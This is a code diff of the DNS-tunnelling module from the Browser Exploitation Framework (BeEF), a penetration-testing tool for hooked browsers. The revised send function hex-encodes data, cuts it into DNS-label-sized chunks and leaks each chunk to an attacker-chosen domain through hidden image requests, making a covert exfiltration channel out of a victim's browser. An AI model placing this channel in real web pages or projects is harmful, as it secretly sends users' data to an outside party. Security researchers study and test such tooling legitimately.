@@ -1,18 +1,9 @@
 //
-//   Copyright 2012 Wade Alcorn wade@bindshell.net
+// Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - http://beefproject.com
+// See the file 'doc/COPYING' for copying permission
 //
-//   Licensed under the Apache License, Version 2.0 (the "License");
-//   you may not use this file except in compliance with the License.
-//   You may obtain a copy of the License at
-//
-//       http://www.apache.org/licenses/LICENSE-2.0
-//
-//   Unless required by applicable law or agreed to in writing, software
-//   distributed under the License is distributed on an "AS IS" BASIS,
-//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-//   See the License for the specific language governing permissions and
-//   limitations under the License.
-//
+
 /*!
  * @literal object: beef.net.dns
  * 
@@ -27,49 +18,70 @@ beef.net.dns = {
 
 	handler: "dns",
 
-	send: function(msgId, messageString, domain, wait, callback) {
+	send: function(msgId, data, domain, callback) {
 
-		var dom = document.createElement('b');
+        var encode_data = function(str) {
+            var result="";
+            for(i=0;i<str.length;++i) {
+                result+=str.charCodeAt(i).toString(16).toUpperCase();
+            }
+            return result;
+        };
 
-		// DNS settings
-		var max_domain_length = 255-5-5-5-5-5;
-		var max_segment_length = max_domain_length - domain.length;
+        var encodedData = encodeURI(encode_data(data));
 
-		// splits strings into chunks
-		String.prototype.chunk = function(n) {
-			if (typeof n=='undefined') n=100;
-			return this.match(RegExp('.{1,'+n+'}','g'));
-		};
+        //TODO remove this
+        console.log(encodedData);
+        console.log("_encodedData_ length: " + encodedData.length);
 
-		// XORs a string
-		xor_encrypt = function(str, key) {
-			var result="";
-			for(i=0;i<str.length;++i) {
-				result+=String.fromCharCode(key^str.charCodeAt(i));
-			}
-			return result;
-		};
+        // limitations to DNS according to RFC 1035:
+        // o Domain names must only consist of a-z, A-Z, 0-9, hyphen (-) and fullstop (.) characters
+        // o Domain names are limited to 255 characters in length (including dots)
+        // o The name space has a maximum depth of 127 levels (ie, maximum 127 subdomains)
+        // o Subdomains are limited to 63 characters in length (including the trailing dot)
 
-		// sends a DNS request
-		sendQuery = function(query) {
-			//console.log("Requesting: "+query);
-			var img = new Image;
-			img.src = "http://"+query;
-			img.onload = function() { dom.removeChild(this); }
-			img.onerror = function() { dom.removeChild(this); }
-			dom.appendChild(img);
-		};
+        // DNS request structure:
+        // COMMAND_ID.SEQ_NUM.SEQ_TOT.DATA.DOMAIN
+      //max_length: 3.   3   .   3   . 63 . x
 
-		// encode message
-		var xor_key = Math.floor(Math.random()*99000+1000);
-		encoded_message = encodeURI(xor_encrypt(messageString, xor_key)).replace(/%/g,".");
+        // only max_data_segment_length is currently used to split data into chunks. and only 1 chunk is used per request.
+        // for optimal performance, use the following vars and use the whole available space (which needs changes server-side too)
+        var reserved_seq_length = 3 + 3 + 3 + 3; // consider also 3 dots
+        var max_domain_length = 255 - reserved_seq_length; //leave some space for sequence numbers
+        var max_data_segment_length = 63; // by RFC
 
-		// Split message into segments
-		segments = encoded_message.chunk(max_segment_length)
-		for (seq=1; seq<=segments.length; seq++) {
-			// send segment
-			sendQuery(msgId+"."+seq+"."+segments.length+"."+xor_key+segments[seq-1]+"."+domain);
-		}
+        //TODO remove this
+        console.log("max_data_segment_length: " + max_data_segment_length);
+
+        var dom = document.createElement('b');
+
+        String.prototype.chunk = function(n) {
+            if (typeof n=='undefined') n=100;
+            return this.match(RegExp('.{1,'+n+'}','g'));
+        };
+
+        var sendQuery = function(query) {
+            var img = new Image;
+            //img.src = "http://"+query;
+            img.src = beef.net.httpproto + "://" + query; // prevents issues with mixed content
+            img.onload = function() { dom.removeChild(this); }
+            img.onerror = function() { dom.removeChild(this); }
+            dom.appendChild(img);
+
+            //experimental
+            //setTimeout(function(){dom.removeChild(img)},1000);
+        };
+
+        var segments = encodedData.chunk(max_data_segment_length);
+
+        var ident = "0xb3"; //see extensions/dns/dns.rb, useful to explicitly mark the DNS request as a tunnel request
+
+        //TODO remove this
+        console.log(segments.length);
+
+        for (var seq=1; seq<=segments.length; seq++) {
+            sendQuery(ident + msgId + "." + seq + "." + segments.length + "." + segments[seq-1] + "." + domain);
+        }
 
 		// callback - returns the number of queries sent
 		if (!!callback) callback(segments.length);
